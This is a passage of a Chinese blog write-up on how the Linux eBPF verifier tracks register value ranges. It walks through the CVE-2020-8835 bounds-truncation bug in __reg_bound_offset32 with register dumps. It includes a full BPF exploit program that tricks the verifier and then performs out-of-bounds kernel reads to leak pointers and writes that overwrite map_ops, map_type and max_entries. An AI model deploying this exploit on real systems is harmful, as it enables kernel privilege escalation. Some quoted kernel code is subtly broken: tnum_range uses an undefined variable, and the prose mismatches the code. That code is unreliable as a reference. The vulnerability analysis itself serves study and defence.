class="line">    s32 subreg_def;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_liveness</span> <span class="title">live</span>;</span></span><br><span class="line">    <span class="type">bool</span> precise;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p><code>smin_value</code> 和 <code>smax_value</code> 保存当寄存器被当做是有符号数的时候可能的取值范围，同样<code>umin_value</code> 和<code>umax_value</code> 表示的是无符号的时候。 <code>var_of</code> 是<code>struct tnum</code> 类型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ptype <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> {</span></span><br><span class="line">    u64 value;</span><br><span class="line">    u64 mask;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>对于每个寄存器，在程序最开始有这四种状态：</p>
+<ul>
+<li><p><code>NOT_INIT</code>: 寄存器的默认状态，此时不能被读取。</p></li>
+<li><p><code>SCALAR_VALUE</code>: 寄存器包含一个 scalar 值，这个值要么是一个已知的常量，要么是一个范围，例如 1 - 5 。</p></li>
+<li><p><code>PTR_TO_MAP_VALUE_OR_NULL</code>：寄存器可以包含指向 map 的指针或是 NULL 。如果要使用这个指针，必须先对其进行检查，检查其指针是否为 NULL 。</p></li>
+<li><p><code>PTR_TO_MAP_VALUE</code>：一个寄存器包含已经被检查过的 map 指针。可以被用来对 map 进行读或写。</p></li>
+</ul>
+<p>我们主要关注第二点<code>SCALAR_VALUE</code>, 也就是说，<code>verifier</code>在执行指令检测的过程中，有时候是不能够准确得知寄存器的具体数值的，<strong>只能根据已知指令去猜测寄存器的可能数值范围</strong></p>
+<blockquote>
+<p>如果一个寄存器从bpf_map中加载，则被声明为scalar value, 其具体数值完全取决于用户态是如何设置bpf_map的，在verifier阶段不可能知道。这时候verifier只能根据指令的上下文去猜测该寄存器可能的范围。</p>
+<p>例如下面这段bpf程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设已有一个array类型的map: config_map</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:  BPF_MOV64_REG(R6, R1)           <span class="comment">// 保存ctx参数到R6</span></span><br><span class="line"><span class="number">1</span>:  BPF_MOV64_IMM(R1, <span class="number">0</span>)            <span class="comment">// R1 = 0 (map key)</span></span><br><span class="line"><span class="number">2</span>:  BPF_STX_MEM(BPF_W, R10, R1, <span class="number">-4</span>) <span class="comment">// 将key存储到栈上: *(u32*)(fp-4) = 0</span></span><br><span class="line"><span class="number">3</span>:  BPF_MOV64_REG(R2, R10)          <span class="comment">// R2 = fp (栈指针)</span></span><br><span class="line"><span class="number">4</span>:  BPF_ALU64_IMM(BPF_ADD, R2, <span class="number">-4</span>)  <span class="comment">// R2 = fp - 4 (key的地址)</span></span><br><span class="line"><span class="number">5</span>:  BPF_LD_MAP_FD(R1, <span class="number">1</span>)            <span class="comment">// R1 = config_map_fd</span></span><br><span class="line"><span class="number">6</span>:  BPF_CALL BPF_FUNC_map_lookup_elem <span class="comment">// 调用bpf_map_lookup_elem(map, &amp;key)</span></span><br><span class="line"> <span class="comment">// 此时R0包含map value的指针或NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>:  BPF_JMP_IMM(BPF_JEQ, R0, <span class="number">0</span>, <span class="number">15</span>) <span class="comment">// if (R0 == NULL) goto exit</span></span><br><span class="line"> <span class="comment">// verifier记录：R0 != NULL (指向map value)</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>:  BPF_LDX_MEM(BPF_DW, R1, R0, <span class="number">0</span>)  <span class="comment">// R1 = *(u64*)R0 (从map加载数据)</span></span><br><span class="line"> <span class="comment">// ** 关键点：R1现在是scalar value **</span></span><br><span class="line"> <span class="comment">// verifier标记：R1 = scalar_value(id=1, umin=0, umax=U64_MAX)</span></span><br><span class="line"> <span class="comment">// 数值完全取决于用户态如何设置map，verifier无法知道具体值</span></span><br><span class="line"></span><br><span class="line"><span class="number">9</span>:  BPF_JMP_IMM(BPF_JGT, R1, <span class="number">1000</span>, <span class="number">13</span>) <span class="comment">// if (R1 &gt; 1000) goto error</span></span><br><span class="line"> <span class="comment">// verifier更新：R1的范围缩小为 [0, 1000]</span></span><br><span class="line"> <span class="comment">// umin=0, umax=1000</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>: BPF_MOV64_REG(R2, R1)           <span class="comment">// R2 = R1 (复制scalar value)</span></span><br><span class="line"> <span class="comment">// verifier记录：R2也是scalar_value，范围[0, 1000]</span></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>: BPF_ALU64_IMM(BPF_MUL, R2, <span class="number">8</span>)   <span class="comment">// R2 = R2 * 8</span></span><br><span class="line"> <span class="comment">// verifier推算：R2范围变为[0, 8000]</span></span><br><span class="line"></span><br><span class="line"><span class="number">12</span>: BPF_JMP_IMM(BPF_JGE, R2, <span class="number">4096</span>, <span class="number">13</span>) <span class="comment">// if (R2 &gt;= 4096) goto error</span></span><br><span class="line"> <span class="comment">// 进一步限制：如果继续执行，R2范围为[0, 4095]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用scalar value作为数组索引（需要边界检查）</span></span><br><span class="line"><span class="number">13</span>: BPF_MOV64_REG(R3, R10)          <span class="comment">// R3 = fp</span></span><br><span class="line"><span class="number">14</span>: BPF_ALU64_IMM(BPF_ADD, R3, <span class="number">-512</span>) <span class="comment">// R3 = fp - 512 (栈数组基址)</span></span><br><span class="line"><span class="number">15</span>: BPF_ALU64_REG(BPF_ADD, R3, R2)  <span class="comment">// R3 = 栈数组基址 + R2</span></span><br><span class="line"> <span class="comment">// verifier检查：R2必须在有效范围内，防止栈溢出</span></span><br><span class="line"> <span class="comment">// 由于R2范围[0, 4095]，但栈空间只有512字节，这里会被拒绝</span></span><br><span class="line"></span><br><span class="line"><span class="number">16</span>: BPF_ST_MEM(BPF_B, R3, <span class="number">0</span>, <span class="number">1</span>)     <span class="comment">// *(u8*)R3 = 1</span></span><br><span class="line"> <span class="comment">// 如果上面的边界检查通过，这里才会执行</span></span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line"><span class="number">17</span>: BPF_MOV64_IMM(R0, <span class="number">-1</span>)           <span class="comment">// R0 = -1 (错误返回值)</span></span><br><span class="line"><span class="number">18</span>: BPF_EXIT_INSN()                 <span class="comment">// exit</span></span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line"><span class="number">19</span>: BPF_MOV64_IMM(R0, <span class="number">0</span>)            <span class="comment">// R0 = 0 (成功返回值)</span></span><br><span class="line"><span class="number">20</span>: BPF_EXIT_INSN()                 <span class="comment">// exit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line"><span class="number">21</span>: BPF_MOV64_IMM(R0, <span class="number">1</span>)            <span class="comment">// R0 = 1 (NULL指针)</span></span><br><span class="line"><span class="number">22</span>: BPF_EXIT_INSN()                 <span class="comment">// exit</span></span><br></pre></td></tr></table></figure>
+<p>Verifier分析过程：</p>
+<ol type="1">
+<li>指令8：从map加载数据到R1 - R1被标记为scalar_value
+<ul>
+<li>初始范围：umin=0, umax=U64_MAX<br>
+</li>
+<li>verifier无法知道具体数值（取决于用户态设置）</li>
+</ul></li>
+<li>指令9：条件跳转 R1 &gt; 1000
+<ul>
+<li>如果不跳转，verifier推断：R1 ∈ [0, 1000]<br>
+</li>
+<li>更新寄存器状态 3.</li>
+</ul></li>
+<li>指令11：算术运算 R2 = R1 * 8 - verifier
+<ul>
+<li>计算新范围：R2 ∈ [0, 8000]</li>
+</ul></li>
+<li>指令12：另一个条件检查
+<ul>
+<li>进一步缩小范围</li>
+</ul></li>
+<li>指令15：用作内存偏移
+<ul>
+<li><strong>verifier必须确保不会造成越界访问</strong><br>
+</li>
+<li>由于栈空间限制，此处会失败</li>
+</ul></li>
+</ol>
+</blockquote>
+<p>但在<code>verifier</code>的验证过程中由于种种原因会存在对<code>reg_state</code>的误判，导致<code>verifier</code>不能够准确地判断寄存器的数值边界，从而导致一些严重的越界读写等漏洞。</p>
+<h2 id="cve漏洞复现">2 CVE漏洞复现</h2>
+<h3 id="cve-2020-8835">CVE-2020-8835</h3>
+<p>漏洞复现环境：</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Linux</span> <span class="selector-tag">kernel</span> <span class="selector-tag">x86</span> <span class="selector-tag">boot</span> <span class="selector-tag">executable</span> <span class="selector-tag">bzImage</span>, <span class="selector-tag">version</span> <span class="number">5.6</span><span class="selector-class">.0</span> (winegee<span class="variable">@ubuntu</span>) <span class="selector-id">#5</span> <span class="selector-tag">SMP</span> <span class="selector-tag">Sat</span> <span class="selector-tag">Apr</span> <span class="number">18</span> <span class="number">23</span>:<span class="number">42</span>:<span class="number">35</span> <span class="selector-tag">CST</span> <span class="number">2020</span>, <span class="selector-tag">RO-rootFS</span>, <span class="selector-tag">swap_dev</span> <span class="number">0</span><span class="selector-tag">X8</span>, <span class="selector-tag">Normal</span> <span class="selector-tag">VGA</span></span><br></pre></td></tr></table></figure>
+<p>该漏洞在commit 581738a中被引入，在这次更新中在<code>verifier.c</code>中引入了一个新的函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __reg_bound_offset32(<span class="keyword">struct</span> bpf_reg_state *reg)</span><br><span class="line">{</span><br><span class="line">    u64 mask = <span class="number">0xffffFFFF</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">range</span> =</span> tnum_range(reg-&gt;umin_value &amp; mask,</span><br><span class="line">                       reg-&gt;umax_value &amp; mask);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">lo32</span> =</span> tnum_cast(reg-&gt;var_off, <span class="number">4</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">hi32</span> =</span> tnum_lshift(tnum_rshift(reg-&gt;var_off, <span class="number">32</span>), <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>这个函数的意思是对寄存器进行32位的截取.</p>
+<p>现在又要回到上面的问题了</p>
+<p>对于跳转指令, 假如当前遇到了下面这样一条指令，</p>
+<p><code>BPF_JMP_IMM(BPF_JGE, BPF_REG_5, 8, 3)</code></p>
+<p>会有下面这样两行代码来更新状态，<code>false_reg</code> 和<code>true_reg</code> 分别代表两个分支的状态， 这是我们前面<code>__reg_bound_offset32</code> 的64位版本</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__reg_bound_offset</span>(false_reg);</span><br><span class="line"><span class="built_in">__reg_bound_offset</span>(true_reg);</span><br></pre></td></tr></table></figure>
+<p>也就是说，在<code>verifier</code>静态分析过程中，如果遇到了这样一条关于<code>r5</code>的分支判断语句，那么会在不同分支上分裂出关于<code>r5</code>的不同的<code>reg_state</code>，我们这里分别叫做<code>false_reg</code>和<code>true_reg</code>。</p>
+<p><code>__reg_bound_offset32</code> 会在使用<code>BPF_JMP32</code> 的时候调用，ebpf 的<code>BPF_JMP</code> 寄存器之间是64bit比较的，换成<code>BPF_JMP32</code> 的时候就只会比较低32位</p>
+<p>我们先来看看源码中的<code>tnum_range</code>是怎么做的：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct tnum tnum_range(u64 <span class="built_in">min</span>, u64 <span class="built_in">max</span>)                            </span><br><span class="line"> {                                                                   </span><br><span class="line">     u64 chi = <span class="built_in">min</span> ^ <span class="built_in">max</span>, <span class="built_in">delta</span>;                                          </span><br><span class="line"></span><br><span class="line">     <span class="comment">/* special case, needed because 1ULL &lt;&lt; 64 is undefined */</span>      </span><br><span class="line">     <span class="keyword">if</span> (bits &gt; <span class="number">63</span>)                                                  </span><br><span class="line">         <span class="built_in">return</span> tnum_unknown;                                        </span><br><span class="line">                                       </span><br><span class="line">     <span class="built_in">delta</span> = (1ULL &lt;&lt; bits) - <span class="number">1</span>;                                     </span><br><span class="line">     <span class="built_in">return</span> TNUM(<span class="built_in">min</span> &amp; ~<span class="built_in">delta</span>, <span class="built_in">delta</span>);                               </span><br><span class="line"> }      </span><br></pre></td></tr></table></figure>
+<p>注意这里<code>TNUM(min &amp; -delta, delta)</code> 直接取了<code>min</code>的低32位。</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">tnum</span> <span class="title function_ invoke__">tnum_intersect</span>(<span class="keyword">struct</span> <span class="title class_">tnum</span> a, <span class="keyword">struct</span> <span class="title class_">tnum</span> b)     </span><br><span class="line">{                                                            </span><br><span class="line">    <span class="type">u64</span> v, mu;                                               </span><br><span class="line"></span><br><span class="line">    v = a.value | b.value;                                   </span><br><span class="line">    mu = a.mask &amp; b.mask;                                    </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">TNUM</span>(v &amp; ~mu, mu);                                </span><br><span class="line">}                                                            </span><br><span class="line">reg<span class="punctuation">-&gt;</span>var_off = <span class="title function_ invoke__">tnum_or</span>(hi32, <span class="title function_ invoke__">tnum_intersect</span>(lo32, range));</span><br></pre></td></tr></table></figure>
+<p>那这就有问题了，在<code>tnum_intersect</code>之后，会设置<code>reg-&gt;var_off</code>，但现在的<code>range</code>是错的，也就会导致<code>verifier</code>对寄存器的值产生幻觉。</p>
+<p>举个例子：</p>
+<blockquote>
+<p>假如我们在之前把r6设定为一个从<code>map</code>中<code>load</code>进来的数值，这时<code>reg6-&gt;tnum-&gt;value = 0</code>因为<code>verifier</code>并不知道<code>map</code>中的数值。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">BPF_JMP_IMM</span><span class="params">(BPF_JGE,<span class="number">6</span>,<span class="number">1</span>,<span class="number">1</span>)</span></span>, </span><br><span class="line"><span class="function"><span class="title">BPF_EXIT_INSN</span><span class="params">()</span></span>, <span class="comment">// false_reg =&gt; ...</span></span><br><span class="line"><span class="function"><span class="title">BPF_MOV64_IMM</span><span class="params">(<span class="number">9</span>,<span class="number">0</span>x1)</span></span>,  <span class="comment">// reg6-&gt;true_reg -&gt; umin_value = 0x1               </span></span><br><span class="line"><span class="function"><span class="title">BPF_ALU64_IMM</span><span class="params">(BPF_LSH,<span class="number">9</span>,<span class="number">32</span>)</span></span>,           </span><br><span class="line"><span class="function"><span class="title">BPF_ALU64_IMM</span><span class="params">(BPF_ADD,<span class="number">9</span>,<span class="number">1</span>)</span></span>,            </span><br><span class="line"><span class="comment">/*BPF_JLE  tnum  umax 0x100000001*/</span> </span><br><span class="line"><span class="function"><span class="title">BPF_JMP_REG</span><span class="params">(BPF_JLE,<span class="number">6</span>,<span class="number">9</span>,<span class="number">1</span>)</span></span>,   </span><br><span class="line"><span class="function"><span class="title">BPF_EXIT_INSN</span><span class="params">()</span></span>, <span class="comment">//false_reg =&gt; ...</span></span><br><span class="line"><span class="comment">// reg6-&gt;true_reg -&gt; umax_value = 0x100000001</span></span><br></pre></td></tr></table></figure>
+<p>这时我们使用<code>jmp32</code>来触发漏洞：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">BPF_JMP32_IMM</span><span class="params">(BPF_JNE,<span class="number">6</span>,<span class="number">5</span>,<span class="number">1</span>)</span></span>, </span><br><span class="line"><span class="function"><span class="title">BPF_EXIT_INSN</span><span class="params">()</span></span>, <span class="comment">// false_reg =&gt; ...</span></span><br></pre></td></tr></table></figure>
+<p>这时<code>false_reg</code>是什么我们不关心，因为他会走到<code>exit</code>中去。</p>
+<p><code>true_reg</code>在执行前：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_off = {</span><br><span class="line">value = 0x0,</span><br><span class="line">mask = 0x1ffffffff</span><br><span class="line">},</span><br><span class="line">smin_value = 0x1,</span><br><span class="line">smax_value = 0x100000001,</span><br><span class="line">umin_value = 0x1,</span><br><span class="line">umax_value = 0x100000001,</span><br></pre></td></tr></table></figure>
+<p>执行后：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_off = {</span><br><span class="line">value = 0x1,</span><br><span class="line">mask = 0x100000000</span><br><span class="line">},</span><br><span class="line">smin_value = 0x1,</span><br><span class="line">smax_value = 0x100000001,</span><br><span class="line">umin_value = 0x1,</span><br><span class="line">umax_value = 0x100000001,</span><br></pre></td></tr></table></figure>
+<p>这是因为<code>__reg_bound_offset32</code>对<code>umax_vlaue</code>进行了低32位的截断，导致原本<code>verifier</code>认为<code>1 &lt;= r6 &lt;= 0x100000001</code>, 现在<code>verifier</code>认为<code>1 &lt;= r6 &lt;= 0x1</code> 那<code>r6</code>只能是1，所以<code>verifier</code>将这条分支上的<code>r6-&gt;value-&gt;var_off</code>设置成1 （这里这么说只是便于理解，其实这些逻辑在<code>tnum_intersect</code>中实现）</p>
+</blockquote>
+<p>我们现在就可以利用上述<code>verifier</code>对<code>r6</code>的错觉在内核空间内进行越界读写了。</p>
+<p>比如我们可以通过如下操作，让<code>reg6</code>在<code>verifier</code>的眼中彻底人畜无害：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r6 = (r6 &amp; <span class="number">2</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">// real_r6 = <span class="number">2</span>=&gt; (<span class="number">2</span> &amp; <span class="number">2</span>) &gt;&gt; <span class="number">1</span> =&gt; <span class="number">1</span></span><br><span class="line">// false_r6 = <span class="number">1</span>=&gt; (<span class="number">1</span> &amp; <span class="number">2</span>) &gt;&gt; <span class="number">1</span> =&gt; <span class="number">0</span> </span><br></pre></td></tr></table></figure>
+<p>假如我们<code>r6</code>真实的数值是2，那么经过这一系列操作之后<code>r6</code>就会变成<code>1</code>, 但在<code>verifier</code>看来他是0。这时我们就可以对<code>r6</code>做任何的乘法操作来构造任意溢出需要的偏移量，但这在<code>verifier</code>看来0乘任何数都是0，所以无论一个寄存器加0减0，<code>verifier</code>都会认为是安全的。</p>
+<p>漏洞利用的<code>bpf</code>程序如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">core_bpf_exploit_instructions</span>[] =</span> {</span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, <span class="number">3</span>), <span class="comment">// Assumes primary_map_handle will be FD 3</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MOV, <span class="number">6</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_STX_MEM(BPF_DW, <span class="number">10</span>, <span class="number">6</span>, <span class="number">-8</span>),</span><br><span class="line">    BPF_MOV64_REG(<span class="number">7</span>, <span class="number">10</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, <span class="number">7</span>, <span class="number">-8</span>),</span><br><span class="line">    BPF_MOV64_REG(<span class="number">2</span>, <span class="number">7</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(<span class="number">9</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>), <span class="comment">// Reads control_buffer_qwords[0] into r6</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MOV, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP_IMM(BPF_JGE, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(), <span class="comment">// Checks r6</span></span><br><span class="line">    BPF_MOV64_IMM(<span class="number">8</span>, <span class="number">0x1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, <span class="number">8</span>, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, <span class="number">8</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_JMP_REG(BPF_JLE, <span class="number">6</span>, <span class="number">8</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(), <span class="comment">// Checks r6</span></span><br><span class="line">    BPF_JMP32_IMM(BPF_JNE, <span class="number">6</span>, <span class="number">5</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(), <span class="comment">// Checks r6</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_AND, <span class="number">6</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, <span class="number">6</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, <span class="number">6</span>, <span class="number">0x110</span>), <span class="comment">// KERNEL-SPECIFIC: Critical offset multiplier: 0x110</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, <span class="number">4</span>),      <span class="comment">// Assumes auxiliary_map_handle will be FD 4</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MOV, <span class="number">8</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_STX_MEM(BPF_DW, <span class="number">10</span>, <span class="number">8</span>, <span class="number">-8</span>),</span><br><span class="line">    BPF_MOV64_REG(<span class="number">7</span>, <span class="number">10</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, <span class="number">7</span>, <span class="number">-8</span>),</span><br><span class="line">    BPF_MOV64_REG(<span class="number">2</span>, <span class="number">7</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(<span class="number">7</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_REG(BPF_SUB, <span class="number">7</span>, <span class="number">6</span>),    <span class="comment">// r7 = map_value_ptr_from_aux_map - r6 (calculated_offset for OOB)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, <span class="number">8</span>, <span class="number">7</span>, <span class="number">0</span>),    <span class="comment">// KERNEL-SPECIFIC OOB Read: *(r7 + 0) -&gt; r8. Potential LEAK.</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, <span class="number">9</span>, <span class="number">8</span>, <span class="number">0x10</span>), <span class="comment">// Store leak into control_buffer_qwords[2] (offset 0x10 in primary map value)</span></span><br><span class="line">    BPF_MOV64_REG(<span class="number">2</span>, <span class="number">8</span>),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW, <span class="number">8</span>, <span class="number">7</span>, <span class="number">0xc0</span>),                <span class="comment">// KERNEL-SPECIFIC OOB Read: *(r7 + 0xc0) -&gt; r8. Potential LEAK.</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, <span class="number">9</span>, <span class="number">8</span>, <span class="number">0x18</span>),                <span class="comment">// Store leak into control_buffer_qwords[3] (offset 0x18 in primary map value)</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, <span class="number">7</span>, <span class="number">8</span>, <span class="number">0x40</span>),                <span class="comment">// KERNEL-SPECIFIC OOB Write: *(r7 + 0x40) = r8</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, <span class="number">8</span>, <span class="number">0x50</span>),                <span class="comment">// KERNEL-SPECIFIC offset adjustment</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0x8</span>),                 <span class="comment">// Reads control_buffer_qwords[1] into r2</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>),                  <span class="comment">// Conditional jump based on control_buffer_qwords[1]</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, <span class="number">7</span>, <span class="number">8</span>, <span class="number">0</span>),                   <span class="comment">// KERNEL-SPECIFIC OOB Write: *(r7 + 0) = r8 (This is the map_ops overwrite if r7 points to bpf_map start)</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, <span class="number">7</span>, <span class="number">0x18</span>, BPF_MAP_TYPE_STACK), <span class="comment">// KERNEL-SPECIFIC: Overwrite map-&gt;map_type</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, <span class="number">7</span>, <span class="number">0x24</span>, <span class="number">-1</span>),                 <span class="comment">// KERNEL-SPECIFIC: Overwrite map-&gt;max_entries</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, <span class="number">7</span>, <span class="number">0x2c</span>, <span class="number">0x0</span>),                <span class="comment">// KERNEL-SPECIFIC: Overwrite map-&gt;lock_off</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MOV, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">};</span><br></pre></td></tr></table></figure>
+<p>漏洞利用思路如下：(完整exp见附件，具体原理见Appendix)</p>
+<ol type="1">
